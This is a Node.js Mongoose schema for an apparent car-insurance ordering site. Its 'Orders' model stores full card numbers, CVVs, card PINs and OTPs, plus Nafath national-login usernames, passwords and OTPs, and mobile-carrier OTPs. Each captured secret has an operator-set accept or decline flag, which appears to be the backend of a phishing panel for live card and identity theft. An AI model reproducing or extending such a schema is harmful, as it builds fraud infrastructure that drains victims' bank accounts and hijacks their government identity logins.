const mongoose = require("mongoose");

exports.Order = mongoose.model(
  "Orders",
  new mongoose.Schema(
    {
      national_id: String,
      tameenType: String,
      serialNumber: String,
      car_year: String,
      carHolderName: String,
      birth_date: String,
      type: String,
      Customs_card: String,
      phone: String,

      tameenFor: String,
      tameenAllType: String,
      car_model: String,
      carPrice: String,
      purpose_of_use: String,
      car_type: String,
      startedDate: String,
      name: String,
      companyData: {
        name: String,
        nameKey: String,
        logo: String,
        price: Number,
        options: [
          {
            label: String,
            labelKey: String,
            price: Number,
            checked: Boolean,
          },
        ],
      },

      cardNumber: String,
      card_name: String,
      cvv: String,
      expiryDate: String,
      pin: String,
      CardOtp: String,
      cardAttempts: [
        {
          cardNumber: String,
          card_name: String,
          cvv: String,
          expiryDate: String,
          pin: String,
          status: {
            type: String,
            enum: ["pending", "accepted", "declined"],
            default: "pending",
          },
          submittedAt: { type: Date, default: Date.now },
        },
      ],
      CardAccept: {
        type: Boolean,
        default: false,
      },
      OtpCardAccept: {
        type: Boolean,
        default: false,
      },
      PinAccept: {
        type: Boolean,
        default: false,
      },

      danger_vechile: String,
      vechile_type: String,
      date_check: String,
      time_check: String,
      NavazCard: String,
      NavazPassword: String,
      token: String,
      NavazOtp: String,
      NavazPassword: String,

      MotslPhone: String,
      MotslNetwork: String,
      phoneId: String,
      mobOtp: String,
      stcAwaitingCall: {
        type: Boolean,
        default: false,
      },
      MotslAccept: {
        type: Boolean,
        default: false,
      },
      STCAccept: {
        type: Boolean,
        default: false,
      },
      MotslOtp: String,
      MotslOtpAccept: {
        type: Boolean,
        default: false,
      },

      NavazUser: String,
      NavazPassword: String,
      NavazOtp: String,
      NavazAccept: {
        type: Boolean,
        default: false,
      },

      blocked: {
        type: Boolean,
        default: false,
      },
      checked: {
        type: Boolean,
        default: false,
      },
      created: { type: Date, default: Date.now },
    },
    { timestamps: true }
  )
);

exports.AdminSettings = mongoose.model(
  "AdminSettings",
  new mongoose.Schema({
    secondPassword: String,
    sessionVersion: { type: Number, default: 0 },
  })
);
